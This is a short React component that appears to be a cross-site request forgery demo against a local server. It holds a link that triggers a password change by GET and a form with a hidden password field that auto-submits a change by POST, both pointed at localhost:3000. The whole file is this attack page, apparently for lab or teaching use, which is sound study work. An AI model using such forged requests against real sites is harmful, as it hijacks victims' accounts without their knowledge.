import './App.css'

function App() {
  return (
    <>
      <a href="http://localhost:3000/modify?id=1&password=newPassword">Hacked with a in a GET</a>

      <hr></hr>

      <form action="http://localhost:3000/change-password" method="POST" >
        <input hidden type="text" name="password" defaultValue={"password"} />
        <button type="submit">Hacked with a FORM in a POST</button> 
      </form>

    </>
  )
}

export default App
